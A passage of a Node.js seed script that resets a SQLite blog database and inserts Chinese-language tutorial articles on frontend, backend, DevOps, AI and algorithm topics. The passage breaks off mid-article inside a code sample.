/**
 * Seed 40+ articles + interactions (likes, bookmarks, comments, views)
 * All articles authored by weipeiluo, interactions from all 5 users.
 * Run: node scripts/seed-data.mjs
 */
import Database from "better-sqlite3";
import path from "path";
import { fileURLToPath } from "url";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const dbPath = path.join(__dirname, "..", "data", "blog.db");
const db = new Database(dbPath);
db.pragma("journal_mode = WAL");
db.pragma("foreign_keys = ON");

// Get users — only use the 4 original seed users (exclude any newly registered users)
const seedUsernames = new Set(["weipeiluo", "admin", "morn1ng", "alice", "bob"]);
const users = db.prepare("SELECT id, username, role FROM users").all().filter(u => seedUsernames.has(u.username));
const weipeiluo = users.find(u => u.username === "weipeiluo");
if (!weipeiluo) { console.error("weipeiluo not found! Run the app first."); process.exit(1); }
const otherUsers = users.filter(u => u.username !== "weipeiluo");

console.log(`Seed users: ${users.map(u => u.username).join(", ")}`);
// Update seed user created_at to before first post (March 15, 2026)
const seedUserDate = "2026-03-15T08:00:00.000Z";
for (const u of users) {
  db.prepare("UPDATE users SET created_at = ?, updated_at = ? WHERE id = ? AND created_at > ?")
    .run(seedUserDate, seedUserDate, u.id, seedUserDate);
}

// Clear existing seed data
db.exec("DELETE FROM user_posts");
db.exec("DELETE FROM comments");
db.exec("DELETE FROM likes");
db.exec("DELETE FROM bookmarks");
db.exec("DELETE FROM views");
console.log("Cleared existing data");

// ── 45 Articles covering all 12 categories ──
const articles = [];

function add(title, content, category, tags, date) {
  const slug = `seed-${Date.now()}-${Math.random().toString(36).slice(2,8)}`;
  const desc = content.replace(/[#*`\n]/g, " ").trim().slice(0, 120);
  articles.push({ title, content, desc, slug, category, tags, date });
}

const now = new Date();
function daysAgo(n) { return new Date(now - n * 86400000).toISOString(); }
function hoursAgo(n) { return new Date(now - n * 3600000).toISOString(); }

// ── Frontend (6 articles) ──
add("React 19 并发特性深度解析",
`## React 19 并发特性深度解析

React 19 带来了全新的并发渲染架构，本文将深入探讨其核心机制。

### 并发模式 vs 传统模式

传统 React 的渲染是**同步且不可中断**的。一旦开始渲染，必须完成整个组件树的更新才能响应新的用户输入。

并发模式通过**时间切片**解决了这个问题：

\`\`\`typescript
// React 19 自动处理优先级调度
function SearchResults({ query }) {
  // useDeferredValue 标记低优先级更新
  const deferredQuery = useDeferredValue(query);
  // 高优先级的输入不受慢搜索影响
  return <ResultList query={deferredQuery} />;
}
\`\`\`

### useTransition 的实际应用

\`useTransition\` 允许你将某些状态更新标记为**低优先级**：

\`\`\`tsx
function TabContainer() {
  const [tab, setTab] = useState("home");
  const [isPending, startTransition] = useTransition();

  function selectTab(nextTab: string) {
    startTransition(() => {
      setTab(nextTab);
    });
  }

  return (
    <div>
      <TabBar onSelect={selectTab} />
      {isPending && <Spinner />}
      <TabContent tab={tab} />
    </div>
  );
}
\`\`\`

### 自动批处理

React 19 将自动批处理扩展到所有更新，不仅仅是事件处理函数：

\`\`\`typescript
// React 19 中这些更新会自动合并为一次渲染
async function handleSubmit() {
  setName(response.name);     // 不触发渲染
  setEmail(response.email);   // 不触发渲染
  setLoading(false);          // 仅触发一次渲染
}
\`\`\`

### Suspense 与数据获取

结合 Suspense 可以实现优雅的加载态：

\`\`\`tsx
function Profile() {
  return (
    <Suspense fallback={<ProfileSkeleton />}>
      <ProfileContent />
    </Suspense>
  );
}
\`\`\`

### 性能对比

| 场景 | React 18 | React 19 |
|------|---------|---------|
| 大列表搜索 | 卡顿 200ms | 流畅 16ms |
| Tab 切换 | 白屏闪现 | 无缝切换 |
| 表单提交 | 2次渲染 | 1次渲染 |

React 19 的并发特性让复杂应用的交互体验达到了新高度。`,
"frontend", ["react", "typescript", "performance"], daysAgo(1));

add("Next.js 16 App Router 实战指南",
`## Next.js 16 App Router 实战指南

Next.js 16 的 App Router 是构建现代全栈应用的利器，本文将带你从零开始搭建一个完整的项目。

### 路由系统

App Router 采用**文件系统路由**：

\`\`\`
src/app/
  page.tsx          → /
  about/page.tsx    → /about
  posts/[slug]/page.tsx → /posts/:slug
\`\`\`

### 服务端组件 vs 客户端组件

默认所有组件都是**服务端组件**，通过 \`"use client"\` 指令声明客户端组件：

\`\`\`typescript
// 服务端组件 — 可以直接访问数据库
async function PostList() {
  const posts = await db.query("SELECT * FROM posts");
  return <ul>{posts.map(p => <PostCard key={p.id} post={p} />)}</ul>;
}
\`\`\`

### 数据获取

App Router 支持多种数据获取模式：

\`\`\`typescript
// 静态生成
export const revalidate = 3600;

// 动态渲染
export const dynamic = "force-dynamic";

// 增量静态再生成
export async function generateStaticParams() {
  return posts.map(p => ({ slug: p.slug }));
}
\`\`\`

### 中间件

\`\`\`typescript
// middleware.ts
export function middleware(request: NextRequest) {
  const token = request.cookies.get("token");
  if (!token && request.nextUrl.pathname.startsWith("/dashboard")) {
    return NextResponse.redirect(new URL("/login", request.url));
  }
}
\`\`\`

App Router 的引入让 Next.js 的架构更加清晰和强大。`,
"frontend", ["nextjs", "typescript", "tutorial"], daysAgo(2));

add("Tailwind CSS v4 新特性速览",
`## Tailwind CSS v4 新特性速览

Tailwind CSS v4 带来了众多激动人心的新特性，本文将快速浏览最重要的变化。

### CSS-first 配置

v4 最大的变化是转向**CSS 原生配置**：

\`\`\`css
@import "tailwindcss";

@theme {
  --color-primary: #3b82f6;
  --color-secondary: #8b5cf6;
  --font-display: "Geist", sans-serif;
}
\`\`\`

### 容器查询

\`\`\`html
<div class="@container">
  <div class="grid @md:grid-cols-2 @lg:grid-cols-3">
    <!-- 基于父容器宽度响应，而非视口 -->
  </div>
</div>
\`\`\`

### 动态调色板

\`\`\`html
<div class="bg-primary-500 text-primary-100">
  <!-- 自动生成 50-950 的色阶 -->
</div>
\`\`\`

### 性能提升

v4 的编译速度提升了**10倍**以上，增量构建几乎是即时的。`,
"frontend", ["tailwind", "tutorial"], daysAgo(3));

add("TypeScript 5 高级类型体操",
`## TypeScript 5 高级类型体操

TypeScript 的类型系统图灵完备，让我们探索一些高级类型技巧。

### 模板字面量类型

\`\`\`typescript
type EventName<T extends string> = \`on\${Capitalize<T>}\`;
type ClickEvent = EventName<"click">; // "onClick"

type CSSValue = \`\${number}px\` | \`\${number}%\` | "auto";
\`\`\`

### 条件类型推断

\`\`\`typescript
type AsyncReturnType<T> = T extends (...args: any[]) => Promise<infer R> ? R : never;

async function fetchUser() { return { name: "Alice", age: 30 }; }
type User = AsyncReturnType<typeof fetchUser>; // { name: string; age: number }
\`\`\`

### 递归类型

\`\`\`typescript
type DeepReadonly<T> = {
  readonly [K in keyof T]: T[K] extends object ? DeepReadonly<T[K]> : T[K];
};

type Path<T> = T extends object ? {
  [K in keyof T]: K extends string ? K | \`\${K}.\${Path<T[K]>}\` : never;
}[keyof T] : never;
\`\`\`

### 协变与逆变

\`\`\`typescript
type Getter<T> = () => T;       // 协变
type Setter<T> = (val: T) => void; // 逆变

// 函数参数逆变保证类型安全
declare let setAnimal: Setter<Animal>;
declare let setDog: Setter<Dog>;
setDog = setAnimal; // 安全：接受 Animal 就能接受 Dog
\`\`\`

掌握这些高级类型能让你的 TypeScript 代码更加类型安全。`,
"frontend", ["typescript", "tutorial"], daysAgo(4));

add("前端性能优化全景指南",
`## 前端性能优化全景指南

性能优化是一个系统性工程，本文从多个维度梳理前端性能优化的最佳实践。

### Core Web Vitals

Google 提出的三个核心指标：
- **LCP**（最大内容绘制）< 2.5s
- **FID**（首次输入延迟）< 100ms
- **CLS**（累积布局偏移）< 0.1

### 加载优化

1. **代码分割**：使用 \`React.lazy\` 和 \`next/dynamic\`
2. **图片优化**：使用 WebP/AVIF 格式，\`loading="lazy"\`
3. **字体优化**：\`font-display: swap\` 防止 FOIT

### 渲染优化

\`\`\`typescript
// 使用 memo 避免不必要的重渲染
const ExpensiveList = memo(function ExpensiveList({ items }: Props) {
  return items.map(item => <ExpensiveItem key={item.id} item={item} />);
});

// 使用 useMemo 缓存计算结果
const sorted = useMemo(() => items.sort(compareFn), [items]);
\`\`\`

### 网络优化

- **CDN**：静态资源部署到 CDN 边缘节点
- **HTTP/2**：多路复用减少连接开销
- **预加载**：\`<link rel="preload">\` 关键资源

### 构建优化

| 技术 | 收益 | 复杂度 |
|------|------|--------|
| Tree Shaking | 减少 20-30% | 低 |
| Code Splitting | 按需加载 | 中 |
| Bundle Analysis | 可视化优化 | 低 |
| ESBuild/SWC | 提速 10x | 中 |

性能优化是一个持续迭代的过程，需要结合监控数据不断调整。`,
"frontend", ["performance", "react", "tutorial"], daysAgo(5));

add("Framer Motion 动画编排技巧",
`## Framer Motion 动画编排技巧

Framer Motion 是 React 生态中最强大的动画库之一。本文整理了一些高级技巧。

### 编排动画序列

使用 \`useAnimate\` 可以编排复杂的动画序列：

\`\`\`tsx
function AnimationSequence() {
  const [scope, animate] = useAnimate();

  async function sequence() {
    await animate("li:first-child", { opacity: 1, x: 0 });
    await animate("li:nth-child(2)", { opacity: 1, x: 0 });
    await animate("li:last-child", { opacity: 1, x: 0 });
  }

  return <ul ref={scope}>...</ul>;
}
\`\`\`

### Layout 动画

\`layout\` prop 让布局变化自动产生动画：

\`\`\`tsx
<motion.div layout>
  {/* 当大小或位置变化时自动过渡 */}
</motion.div>
\`\`\`

### 手势动画

\`\`\`tsx
<motion.div
  whileHover={{ scale: 1.05 }}
  whileTap={{ scale: 0.95 }}
  drag="x"
  dragConstraints={{ left: 0, right: 300 }}
/>
\`\`\`

### 滚动联动

\`\`\`tsx
const { scrollYProgress } = useScroll();
const scale = useTransform(scrollYProgress, [0, 1], [1, 0.5]);
\`\`\`

Framer Motion 让 Web 动画变得简单而又强大。`,
"frontend", ["framer-motion", "react"], daysAgo(6));

// ── Backend (6 articles) ──
add("Node.js 微服务架构设计",
`## Node.js 微服务架构设计

微服务架构将大型应用拆分为小型、自治的服务。本文基于 Node.js 讨论微服务设计的最佳实践。

### 服务拆分原则

按**业务领域**拆分，而非技术层：

\`\`\`
✅ 用户服务 / 订单服务 / 商品服务
❌ 控制器层 / 服务层 / DAO层
\`\`\`

### 服务间通信

| 方式 | 适用场景 | 特点 |
|------|---------|------|
| REST API | 同步请求 | 简单、通用 |
| gRPC | 高性能同步 | 强类型、二进制 |
| 消息队列 | 异步解耦 | 削峰、可靠 |
| GraphQL | 灵活查询 | 按需获取 |

### Node.js 微服务框架

\`\`\`typescript
// NestJS 微服务示例
@Controller()
class UserController {
  @MessagePattern({ cmd: "get_user" })
  getUser(@Payload() id: number) {
    return this.userService.findById(id);
  }
}
\`\`\`

### 服务治理

- **健康检查**：每个服务暴露 \`/health\` 端点
- **熔断器**：使用 \`opossum\` 库防止级联故障
- **链路追踪**：OpenTelemetry + Jaeger
- **日志聚合**：ELK Stack

### 部署策略

\`\`\`yaml
# Docker Compose 多服务编排
services:
  api-gateway:
    image: gateway:latest
  user-service:
    image: user-service:latest
  order-service:
    image: order-service:latest
\`\`\`

微服务架构虽好，但不要过早拆分——先确保单体架构遇到真正的瓶颈再考虑。`,
"backend", ["nodejs", "api", "database"], daysAgo(7));

add("Python 数据科学工具链 2026",
`## Python 数据科学工具链 2026

Python 数据科学生态在 2026 年有了显著进化，本文带你了解最新的工具链。

### 核心库更新

- **Pandas 3.0**：原生 Arrow 后端，性能提升 5-10x
- **Polars**：Rust 编写的高性能 DataFrame 库，逐步替代 Pandas
- **Seaborn 0.14**：全新 API，更好的默认主题

### 数据管道最佳实践

\`\`\`python
import polars as pl

# 链式操作，惰性执行
result = (
    pl.scan_csv("large_file.csv")
    .filter(pl.col("date") > "2024-01-01")
    .group_by("category")
    .agg(pl.col("amount").sum())
    .sort("amount", descending=True)
    .limit(10)
    .collect()
)
\`\`\`

### Jupyter 生态

- **JupyterLab 5**：实时协作编辑
- **Marimo**：响应式 Notebook，替代传统 Jupyter
- **Quarto**：学术写作与出版的统一工具

### ML 框架

| 框架 | 适用场景 | 特点 |
|------|---------|------|
| PyTorch 3.0 | 深度学习 | 动态图，灵活 |
| Hugging Face | NLP/CV | 预训练模型 |
| XGBoost 3.0 | 表格数据 | 梯度提升 |
| FastAI | 快速原型 | 高层 API |

Python 数据科学的门槛越来越低，但深度越来越深。`,
"backend", ["python", "ai", "tutorial"], daysAgo(8));

add("Rust 与 Go：系统编程语言选型",
`## Rust 与 Go：系统编程语言选型

Rust 和 Go 代表了现代系统编程的两种不同哲学。

### 设计哲学

**Go** 追求简单：
\`\`\`go
func process(items []Item) []Result {
    results := make([]Result, 0, len(items))
    for _, item := range items {
        if result, err := transform(item); err == nil {
            results = append(results, result)
        }
    }
    return results
}
\`\`\`

**Rust** 追求安全和性能：
\`\`\`rust
fn process(items: Vec<Item>) -> Vec<Result> {
    items.into_iter()
        .filter_map(|item| transform(item).ok())
        .collect()
}
\`\`\`

### 内存管理

| 特性 | Go | Rust |
|------|-----|------|
| GC | 并发标记-清除 | 无（所有权系统） |
| 内存安全 | GC 保证 | 编译期保证 |
| 性能 | 接近 C | 等于 C/C++ |
| 学习曲线 | 1-2 周 | 1-3 月 |

### 并发模型

Go 的 goroutine 轻量且易用，Rust 的 async/await 提供零成本抽象。两者都是各自领域的佼佼者。

选择 Go 如果你重视开发速度和简洁性，选择 Rust 如果你需要极致性能和安全保证。`,
"backend", ["rust", "go", "performance"], daysAgo(9));

add("API 设计最佳实践",
`## API 设计最佳实践

一个好的 API 设计能极大提升开发体验。本文总结 REST API 设计的关键原则。

### URL 设计

\`\`\`
✅ GET    /api/users/123/orders
✅ POST   /api/users           (创建)
✅ PATCH  /api/users/123       (部分更新)
❌ GET    /api/getUserOrders?id=123
❌ POST   /api/createUser
\`\`\`

### 分页

\`\`\`typescript
interface PaginatedResponse<T> {
  data: T[];
  pagination: {
    page: number;
    pageSize: number;
    total: number;
    totalPages: number;
  };
}
\`\`\`

### 错误处理

\`\`\`json
{
  "error": {
    "code": "VALIDATION_ERROR",
    "message": "Username is required",
    "details": [
      { "field": "username", "reason": "required" }
    ]
  }
}
\`\`\`

### 版本管理

- URL 版本：\`/api/v1/users\`
- Header 版本：\`Accept: application/vnd.api+json;version=1\`
- 推荐 URL 版本，简单直观

### 安全

- 始终使用 HTTPS
- 对输入进行校验和清理
- 限制请求速率
- 使用 JWT 或 OAuth 2.0 认证

好的 API 设计让你的服务对使用者友好而高效。`,
"backend", ["api", "tutorial", "security"], daysAgo(10));

add("全栈开发实战：从零搭建博客系统",
`## 全栈开发实战：从零搭建博客系统

本文记录从零开发一个全栈个人博客的完整过程，涵盖技术选型、架构设计和实现细节。

### 技术栈

| 层级 | 技术 | 选择理由 |
|------|------|---------|
| 前端 | Next.js 16 + React 19 | SSR/SSG/ISR 灵活切换 |
| 样式 | Tailwind CSS v4 | 原子化CSS，快速开发 |
| 数据库 | SQLite + Drizzle ORM | 零配置，适合中小型项目 |
| 认证 | JWT + httpOnly Cookie | 安全的会话管理 |
| 动画 | Framer Motion | 声明式动画API |
| 部署 | PM2 + Nginx | 稳定的Node.js进程管理 |

### 核心功能

- **文章系统**：支持 Markdown 编辑和实时预览
- **评论系统**：嵌套回复，支持 Markdown 格式
- **社交互动**：点赞、收藏、浏览量统计
- **用户系统**：邮箱验证注册、角色权限管理
- **排行榜**：基于互动数据计算用户积分排名

### 数据库设计

设计了7张核心表：users（用户）、user_posts（文章）、comments（评论）、likes（点赞）、bookmarks（收藏）、views（浏览量）、name_change_requests（改名审核）。

### 部署

使用 PM2 进行进程守护，Nginx 反向代理，全自动 CI/CD 通过 GitHub Actions 实现。`,
"backend", ["nodejs", "tutorial", "database", "api"], daysAgo(11));

add("Web 应用认证机制全解析",
`## Web 应用认证机制全解析

认证是每个 Web 应用的基础设施。本文全面梳理各类认证方案。

### JWT vs Session

| 特性 | JWT | Session |
|------|-----|---------|
| 存储位置 | 客户端 | 服务端 |
| 扩展性 | 好（无状态） | 需共享存储 |
| 安全性 | 令牌泄露风险 | CSRF 风险 |
| 撤销 | 困难 | 简单 |

### JWT 最佳实践

\`\`\`typescript
// 使用 httpOnly Cookie 存储 JWT
cookieStore.set("token", jwt, {
  httpOnly: true,
  secure: process.env.NODE_ENV === "production",
  sameSite: "lax",
  maxAge: 7 * 24 * 3600,
});

// 短生命周期的 Access Token + 长生命周期的 Refresh Token
const accessToken = sign({ userId: user.id }, secret, { expiresIn: "15m" });
const refreshToken = sign({ userId: user.id }, refreshSecret, { expiresIn: "7d" });
\`\`\`

### OAuth 2.0 流程

1. 用户点击 "用 GitHub 登录"
2. 重定向到 GitHub 授权页
3. 用户同意授权
4. GitHub 回调，携带授权码
5. 后端用授权码换取 Access Token
6. 用 Access Token 获取用户信息

### 双因素认证

增加 TOTP（基于时间的一次性密码）作为第二认证因子，大幅提升账户安全性。

认证方案的选择取决于你的应用场景和安全需求。`,
"backend", ["api", "security", "tutorial"], daysAgo(12));

// ── DevOps (4 articles) ──
add("Docker 容器编排从入门到精通",
`## Docker 容器编排从入门到精通

Docker 已经成为现代应用部署的标准。本文系统介绍 Docker 的核心概念和编排技术。

### 核心概念

**镜像 vs 容器**：镜像是只读模板，容器是镜像的运行实例。

\`\`\`dockerfile
FROM node:22-alpine
WORKDIR /app
COPY package*.json ./
RUN npm ci --production
COPY . .
EXPOSE 3000
CMD ["node", "server.js"]
\`\`\`

### Docker Compose

\`\`\`yaml
version: "3.8"
services:
  app:
    build: .
    ports: ["3000:3000"]
    depends_on:
      db:
        condition: service_healthy
  db:
    image: postgres:17
    volumes: ["pgdata:/var/lib/postgresql/data"]
    healthcheck:
      test: ["CMD-SHELL", "pg_isready"]
      interval: 5s
\`\`\`

### 多阶段构建

\`\`\`dockerfile
FROM node:22 AS build
WORKDIR /app
COPY . .
RUN npm ci && npm run build

FROM node:22-alpine
COPY --from=build /app/.next ./.next
COPY --from=build /app/node_modules ./node_modules
CMD ["node", "node_modules/.bin/next", "start"]
\`\`\`

### 编排选择

| 工具 | 适用场景 | 复杂度 |
|------|---------|--------|
| Docker Compose | 单机 | 低 |
| Docker Swarm | 小集群 | 中 |
| Kubernetes | 大规模 | 高 |

容器化是现代 DevOps 的基础设施。`,
"devops", ["docker", "kubernetes", "linux"], daysAgo(13));

add("K8s 生产环境避坑指南",
`## K8s 生产环境避坑指南

Kubernetes 强大但复杂，本文分享生产环境中的常见陷阱和解决方案。

### 资源配置

\`\`\`yaml
resources:
  requests:
    memory: "256Mi"
    cpu: "250m"
  limits:
    memory: "512Mi"
    cpu: "500m"
\`\`\`

**必须设置 resource requests 和 limits**，否则 Pod 可能被 OOM Killer 杀掉或无限占用资源。

### 健康检查

\`\`\`yaml
livenessProbe:
  httpGet:
    path: /health
    port: 3000
  initialDelaySeconds: 30
  periodSeconds: 10
readinessProbe:
  httpGet:
    path: /ready
    port: 3000
  initialDelaySeconds: 5
  periodSeconds: 5
\`\`\`

### 滚动更新策略

\`\`\`yaml
strategy:
  type: RollingUpdate
  rollingUpdate:
    maxUnavailable: 0
    maxSurge: 1
\`\`\`

\`maxUnavailable: 0\` 确保更新期间始终有可用的 Pod。

### 常见问题

1. **ImagePullBackOff**：检查镜像仓库认证和镜像标签
2. **CrashLoopBackOff**：检查应用日志，通常是启动错误
3. **Pending Pod**：可能是资源不足或 PVC 未绑定

Kubernetes 的学习曲线陡峭，但掌握后你的运维能力将大幅提升。`,
"devops", ["kubernetes", "docker", "linux", "tutorial"], daysAgo(14));

add("Linux 服务器运维笔记",
`## Linux 服务器运维笔记

记录日常运维中的实用技巧和脚本积累。

### 系统监控

\`\`\`bash
# 实时监控 CPU/内存
htop

# 磁盘使用
df -h && du -sh /* 2>/dev/null | sort -rh | head -20

# 网络连接
ss -tlnp
\`\`\`

### 日志管理

\`\`\`bash
# journalctl 查询
journalctl -u nginx --since "1 hour ago" -f

# 日志轮转配置 /etc/logrotate.d/myapp
/var/log/myapp/*.log {
    daily
    rotate 7
    compress
    missingok
    notifempty
}
\`\`\`

### 定时任务

\`\`\`bash
# 每天凌晨 3 点备份数据库
0 3 * * * /opt/scripts/backup-db.sh

# 每周日清理旧日志
0 4 * * 0 find /var/log -name "*.gz" -mtime +30 -delete
\`\`\`

### 安全加固

- 禁用 root SSH 登录：\`PermitRootLogin no\`
- 配置 fail2ban 防止暴力破解
- 定期 \`apt update && apt upgrade\`
- 使用 UFW 防火墙：\`ufw allow 22/tcp && ufw allow 80,443/tcp\`

Linux 运维靠的是**日积月累**，每个命令都可能在未来救你一命。`,
"devops", ["linux", "docker"], daysAgo(15));

add("CI/CD 自动化部署流水线",
`## CI/CD 自动化部署流水线

持续集成和持续部署是现代软件开发的基石。本文介绍 CI/CD 管道的搭建和优化。

### GitHub Actions

\`\`\`yaml
name: Deploy
on:
  push:
    branches: [main]
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 22
      - run: npm ci
      - run: npm run build
      - run: npm test
      - name: Deploy to server
        uses: appleboy/ssh-action@v1
        with:
          host: \${{ secrets.SERVER_HOST }}
          username: ubuntu
          key: \${{ secrets.SSH_KEY }}
          script: |
            cd /home/ubuntu/wpl
            git pull origin main
            cd toy/my-blog
            npm run build
            pm2 restart nexus-blog
\`\`\`

### 部署策略

| 策略 | 停机时间 | 风险 | 资源 |
|------|---------|------|------|
| 蓝绿部署 | 0 | 低 | 2x |
| 滚动更新 | 0 | 中 | 1x |
| 金丝雀发布 | 0 | 最低 | 略高 |

### 回滚机制

每次部署前保存数据库快照和构建产物，以便快速回滚。自动化 CI/CD 让你的发布流程从小时级缩短到分钟级。`,
"devops", ["docker", "linux", "tutorial"], daysAgo(16));

// ── AI/ML (4 articles) ──
add("LLM 应用开发入门",
`## LLM 应用开发入门

大语言模型正在改变软件开发的方式。本文介绍如何构建 LLM 驱动的应用。

### 核心概念

- **Prompt Engineering**：通过精心设计的提示词引导模型输出
- **RAG**：检索增强生成，结合外部知识库
- **Function Calling**：让 LLM 调用你的 API
- **Fine-tuning**：在特定数据集上微调模型

### RAG 架构

\`\`\`python
from langchain.document_loaders import TextLoader
from langchain.text_splitter import RecursiveCharacterTextSplitter
from langchain.embeddings import OpenAIEmbeddings
from langchain.vectorstores import Chroma

# 1. 加载文档
loader = TextLoader("knowledge_base.txt")
documents = loader.load()

# 2. 分割文档
text_splitter = RecursiveCharacterTextSplitter(chunk_size=500, chunk_overlap=50)
chunks = text_splitter.split_documents(documents)

# 3. 构建向量数据库
vectorstore = Chroma.from_documents(chunks, OpenAIEmbeddings())

# 4. 检索 + 生成
retriever = vectorstore.as_retriever()
qa_chain = RetrievalQA.from_chain_type(llm=llm, retriever=retriever)
\`\`\`

### Prompt 模板

\`\`\`python
system_prompt = """
你是一个技术博客作者，擅长将复杂概念转化为易懂的教程。
使用 Markdown 格式，包含代码示例。
目标读者是有 2-3 年经验的开发者。
"""
\`\`\`

### 应用场景

| 场景 | 方案 | 难度 |
|------|------|------|
| 客服机器人 | RAG + 微调 | 中 |
| 代码助手 | Fine-tuned Code LLM | 高 |
| 内容生成 | Prompt + Few-shot | 低 |
| 数据分析 | Function Calling + SQL | 中 |

LLM 应用开发的核心是**理解模型的边界和设计合适的交互模式**。`,
"ai-ml", ["ai", "llm", "python"], daysAgo(17));

add("RAG 深入：从理论到实践",
`## RAG 深入：从理论到实践

RAG（检索增强生成）是 LLM 应用中最实用的技术之一。本文将深入其原理和实现。

### 为什么需要 RAG

LLM 有两个固有局限：
1. **知识截止日期**：训练数据有时间限制
2. **幻觉**：可能生成看似合理但错误的内容

RAG 通过检索外部知识来缓解这两个问题。

### 检索策略

**密集检索**（语义相似度）vs **稀疏检索**（关键词匹配）：

\`\`\`typescript
// 混合检索：结合两种策略
async function hybridSearch(query: string) {
  const [dense, sparse] = await Promise.all([
    vectorDB.search(query, { k: 10 }),    // 语义检索
    keywordIndex.search(query, { k: 10 }), // 关键词检索
  ]);
  return reciprocalRankFusion([dense, sparse]);
}
\`\`\`

### Chunking 策略

| 策略 | 适用场景 | 优缺点 |
|------|---------|--------|
| 固定大小 | 通用 | 简单但可能切断语义 |
| 按段落 | 文档 QA | 保持上下文 |
| 语义分割 | 长文档 | 最优但计算量大 |
| 递归分割 | 代码 | 保持语法结构 |

### 评估指标

- **Faithfulness**：回答是否忠实于检索到的文档
- **Answer Relevance**：回答是否与问题相关
- **Context Precision**：检索的文档是否精确

RAG 目前是构建可靠的 LLM 应用的**最有效的技术栈之一**。`,
"ai-ml", ["ai", "llm", "python", "tutorial"], daysAgo(18));

add("深度学习模型部署实战",
`## 深度学习模型部署实战

训练出好的模型只是开始，如何高效部署才是真正的挑战。

### 部署方案对比

| 方案 | 延迟 | 吞吐量 | 成本 | 适用场景 |
|------|------|--------|------|---------|
| Flask + PyTorch | 高 | 低 | 低 | 原型 |
| TorchServe | 中 | 中 | 中 | 生产 |
| Triton Inference | 低 | 高 | 高 | 大规模 |
| ONNX Runtime | 低 | 中 | 低 | 跨平台 |

### ONNX 导出

\`\`\`python
import torch.onnx

# 导出 ONNX 模型
dummy_input = torch.randn(1, 3, 224, 224)
torch.onnx.export(
    model, dummy_input, "model.onnx",
    input_names=["input"],
    output_names=["output"],
    dynamic_axes={"input": {0: "batch"}, "output": {0: "batch"}}
)
\`\`\`

### 模型优化

1. **量化**：FP32 → INT8，体积减少 75%，速度提升 2-3x
2. **剪枝**：移除不重要的权重
3. **蒸馏**：用大模型教小模型
4. **批处理**：合并多个请求提高吞吐量

### 监控

部署后需要持续监控：
- 推理延迟（P50/P95/P99）
- 吞吐量（QPS）
- 模型输出质量（漂移检测）

从训练到部署是一条长路，但每一步都有成熟的工具支持。`,
"ai-ml", ["ai", "python", "tutorial"], daysAgo(19));

add("提示工程进阶技巧",
`## 提示工程进阶技巧

Prompt Engineering 已经从"试错"逐步走向工程化。本文介绍一些高级技巧。

### Chain of Thought

"Let's think step by step" 能让模型将复杂问题分解：

\`\`\`
Q: 一个水果摊有 47 个苹果，上午卖出 12 个，下午进货 25 个，又卖出 8 个。现在有多少个苹果？

A: Let me think step by step.
1. 初始：47 个苹果
2. 卖出 12 个：47 - 12 = 35
3. 进货 25 个：35 + 25 = 60
4. 卖出 8 个：60 - 8 = 52
答：现在有 52 个苹果。
\`\`\`

### Few-Shot 示例

提供 2-3 个示例能让模型显著提高准确率：

\`\`\`
将以下英文翻译成中文（保留技术术语）：

Input: The React component renders a virtual DOM tree.
Output: React 组件渲染一棵 virtual DOM 树。

Input: Use the useEffect hook for side effects.
Output: 使用 useEffect hook 处理副作用。

Input: [你的文本]
\`\`\`

### System Prompt 设计

好的 system prompt 要包含：
1. **角色定义**：你是谁
2. **任务描述**：做什么
3. **输出格式**：怎么呈现
4. **约束条件**：不能做什么
5. **示例**：什么是好的输出

提示工程是一门**实践的艺术**，多试、多测、多迭代。`,
"ai-ml", ["ai", "llm", "tutorial"], daysAgo(20));

// ── Algorithm (4 articles) ──
add("算法竞赛入门：从零到蓝桥杯省一",
`## 算法竞赛入门：从零到蓝桥杯省一

算法竞赛并不神秘，掌握正确的方法，你也能取得好成绩。

### 基础知识

**必须掌握的数据结构**：
- 数组、链表、栈、队列
- 哈希表（unordered_map/set）
- 二叉树、堆（优先队列）
- 并查集、线段树

**必须掌握的算法**：
- 排序（快排、归并）
- 二分查找（含二分答案）
- DFS/BFS（含回溯和记忆化搜索）
- 动态规划（背包、区间 DP、树形 DP）
- 贪心、最短路径、最小生成树

### 刷题路线

\`\`\`cpp
// 经典题目：最长递增子序列 O(nlogn)
int lengthOfLIS(vector<int>& nums) {
    vector<int> tails; // tails[i] = 长度为 i+1 的 LIS 的最小结尾
    for (int x : nums) {
        auto it = lower_bound(tails.begin(), tails.end(), x);
        if (it == tails.end()) tails.push_back(x);
        else *it = x;
    }
    return tails.size();
}
\`\`\`

### 比赛策略

1. 先通读所有题目，从最简单的开始
2. 注意数据范围，估算时间复杂度
3. 善用 STL，减少编码时间
4. 不要在一道题上卡太久

算法竞赛提升的是**编程思维**和**问题求解能力**。`,
"algorithm", ["cpp", "tutorial"], daysAgo(21));

add("动态规划从入门到进阶",
`## 动态规划从入门到进阶

动态规划（DP）是算法竞赛中最重要的技巧之一。本文从零开始讲解 DP。

### 核心思想

1. **状态定义**：用 dp[i] 表示什么
2. **状态转移**：dp[i] 如何从 dp[j] (j < i) 推导
3. **边界条件**：dp[0] 或 dp[1] 的值
4. **计算顺序**：从小到大

### 经典问题

\`\`\`cpp
// 01 背包
int knapsack(vector<int>& w, vector<int>& v, int W) {
    int n = w.size();
    vector<int> dp(W + 1);
    for (int i = 0; i < n; i++)
        for (int j = W; j >= w[i]; j--)
            dp[j] = max(dp[j], dp[j - w[i]] + v[i]);
    return dp[W];
}
\`\`\`

### 优化技巧

| 技巧 | 效果 | 适用 |
|------|------|------|
| 滚动数组 | 降低空间 | 01背包 |
| 前缀和 | 加速转移 | 区间DP |
| 单调队列 | O(n²)→O(n) | 特定DP |
| 状态压缩 | 简化表示 | 排列DP |

DP 的精髓在于**找到子问题的重叠结构**。多练习，自然会形成直觉。`,
"algorithm", ["cpp", "tutorial"], daysAgo(22));

add("LeetCode 高频题精讲：Top 100",
`## LeetCode 高频题精讲：Top 100

本文精选 LeetCode 面试最高频的 Top 100 题，按类型分类讲解。

### 双指针

\`\`\`python
# 盛最多水的容器 O(n)
def maxArea(height: List[int]) -> int:
    l, r, ans = 0, len(height) - 1, 0
    while l < r:
        ans = max(ans, min(height[l], height[r]) * (r - l))
        if height[l] < height[r]: l += 1
        else: r -= 1
    return ans
\`\`\`

### 滑动窗口

\`\`\`python
# 无重复字符的最长子串
def lengthOfLongestSubstring(s: str) -> int:
    seen, l, ans = {}, 0, 0
    for r, c in enumerate(s):
        if c in seen and seen[c] >= l: l = seen[c] + 1
        seen[c] = r
        ans = max(ans, r - l + 1)
    return ans
\`\`\`

### 堆（优先队列）

\`\`\`python
